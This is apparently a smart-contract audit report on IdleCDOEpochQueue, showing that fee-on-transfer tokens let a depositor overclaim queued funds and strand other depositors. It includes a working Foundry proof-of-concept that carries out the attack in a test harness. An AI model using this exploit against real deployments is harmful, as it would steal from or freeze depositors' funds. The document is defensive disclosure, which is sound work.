### Title
Fee-on-transfer deposits overcredit queued principal and permanently strand depositors - (File: contracts/IdleCDOEpochQueue.sol)

### Summary
`IdleCDOEpochQueue.requestDeposit` credits the caller with the declared `amount` instead of the amount actually received, while `deleteRequest` later pays out the credited amount. With a fee-on-transfer underlying, an unprivileged KYC-passed depositor can create a queue liability larger than its token balance, then withdraw the full credited amount and leave other depositors’ funds undercollateralized. The downstream deposit path also continues to forward the declared amount rather than the received amount.

### Finding Description
`requestDeposit` performs `safeTransferFrom(msg.sender, address(this), amount)` and then increments both `userDepositsEpochs` and `epochPendingDeposits` by the declared `amount`, without measuring the balance delta. [1](#0-0) 

During a running epoch, any wallet passing `isWalletAllowed` can use this path because `_checkAllowed` only verifies the epoch state and Keyring status. [2](#0-1) 

Before the epoch is priced or prefunded, `deleteRequest` reads the recorded amount and transfers that full amount back to the caller. [3](#0-2) 

For an underlying charging a 10% transfer fee, a victim deposit of `100` followed by an attacker deposit of `100` leaves the queue with `180`, but the ledger tracks `200`. The attacker can delete the request and recover `100` gross, leaving `80` or `90` tokens against the victim’s remaining `100` liability depending on whether the token also charges outgoing transfer fees. Subsequent `deleteRequest` calls revert on insufficient balance, while `processDeposits` attempts to deposit the full recorded pending amount into the CDO. [4](#0-3) 

The mismatch is not isolated to the queue: `IdleCDOCreditVault._deposit` mints using the received balance delta but still calls `strategy.deposit(_amount)` with the declared amount. [5](#0-4)  `IdleCreditVault.deposit` likewise transfers and mints the declared amount without checking the amount actually received. [6](#0-5) 

### Impact Explanation
The queue’s deposit liability can exceed its token balance by the transfer fee on each malicious request. A victim cannot recover the recorded deposit once prior withdrawals have consumed the missing balance, and manager-driven epoch processing also cannot source the recorded amount. Absent an unrelated top-up, this permanently freezes the shortfall; for a 10% fee token, one malicious deposit of size `D` strands approximately `D * feeBps / 10_000` of queued principal, and the attack can be repeated. [7](#0-6) 

### Likelihood Explanation
The exploit requires a deployment whose underlying ERC20 charges fees, burns tokens, or otherwise transfers less than the declared `amount`; a plain USDC-style token does not trigger it. The initializers accept an arbitrary nonzero ERC20 token and do not enforce exact-transfer behavior. [8](#0-7) [9](#0-8)  The attacker needs only a KYC-passing wallet and a running epoch; no privileged role is required for the malicious deposit and deletion. [10](#0-9) 

### Recommendation
Explicitly reject non-exact ERC20 transfers at every external token ingress. At minimum, measure `balanceAfter - balanceBefore` in `IdleCDOEpochQueue.requestDeposit` and revert when it differs from `amount`; apply the same validation in `IdleCDOCreditVault._deposit` and `IdleCreditVault.deposit`. If fee-on-transfer assets must be supported, all three layers must consistently account for actual received amounts, but exact-transfer enforcement is safer because the CDO and strategy assume 1:1 underlying-to-strategy-token accounting. [1](#0-0) [5](#0-4) 

### Proof of Concept
The following Foundry PoC deploys a minimal exact-harness queue around a token charging a 10% fee on both `transfer` and `transferFrom`. It demonstrates that the queue retains only `80` tokens after the attacker exits while still recording a `100`-token victim liability.

```solidity
// test/foundry/IdleCDOEpochQueueFeeToken.t.sol
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../../contracts/IdleCDOEpochQueue.sol";

contract FeeToken is ERC20 {
    constructor() ERC20("FeeToken", "FEE") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function transfer(address to, uint256 amount)
        public
        override
        returns (bool)
    {
        uint256 fee = amount / 10;
        _transfer(msg.sender, to, amount - fee);
        _burn(msg.sender, fee);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount)
        public
        override
        returns (bool)
    {
        uint256 fee = amount / 10;
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount - fee);
        _burn(from, fee);
        return true;
    }
}

contract FakeStrategy {
    uint256 public epochNumber;
}

contract FakeCDO {
    address public strategy;
    address public token;
    address public AATranche = address(0xAA);
    address public BBTranche = address(0xBB);

    constructor(address _strategy, address _token) {
        strategy = _strategy;
        token = _token;
    }

    function isEpochRunning() external pure returns (bool) {
        return true;
    }

    function isWalletAllowed(address) external pure returns (bool) {
        return true;
    }
}

contract IdleCDOEpochQueueFeeTokenPoC is Test {
    function testFeeTransferDepositLeavesQueueInsolvent() external {
        FeeToken underlying = new FeeToken();
        FakeStrategy strategy = new FakeStrategy();
        FakeCDO cdo = new FakeCDO(address(strategy), address(underlying));

        IdleCDOEpochQueue queue = new IdleCDOEpochQueue();
        queue.initialize(address(cdo), address(this), true);

        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");
        uint256 amount = 100 ether;
        uint256 nextEpoch = strategy.epochNumber() + 1;

        underlying.mint(victim, amount);
        underlying.mint(attacker, amount);

        vm.startPrank(victim);
        underlying.approve(address(queue), amount);
        queue.requestDeposit(amount);
        vm.stopPrank();

        vm.startPrank(attacker);
        underlying.approve(address(queue), amount);
        queue.requestDeposit(amount);
        queue.deleteRequest(nextEpoch);
        vm.stopPrank();

        // The attacker paid and received 100 gross, but transfer fees burned 20
        // across the two queue deposits and the attacker's withdrawal.
        assertEq(underlying.balanceOf(address(queue)), 80 ether);
        assertEq(queue.epochPendingDeposits(nextEpoch), amount);
        assertEq(queue.userDepositsEpochs(victim, nextEpoch), amount);

        // The victim's recorded deposit is now larger than the queue balance.
        vm.prank(victim);
        vm.expectRevert();
        queue.deleteRequest(nextEpoch);
    }
}
```

```text
  function deleteRequest(uint256 _requestEpoch) external {
    // if the epoch price is already set, deposits were already processed so
    // the deposit request can't be deleted.
    _checkNotAllowed(epochPrice[_requestEpoch] != 0 || epochPrefundedDeposits[_requestEpoch] != 0);

    uint256 amount = userDepositsEpochs[msg.sender][_requestEpoch];
    if (amount == 0) {
      return;
    }
    // reset user deposit for the epoch
    userDepositsEpochs[msg.sender][_requestEpoch] = 0;
    // update pending deposits
    epochPendingDeposits[_requestEpoch] -= amount;
    // transfer underlyings back to the user
    IERC20Detailed(underlying).safeTransfer(msg.sender, amount);
```
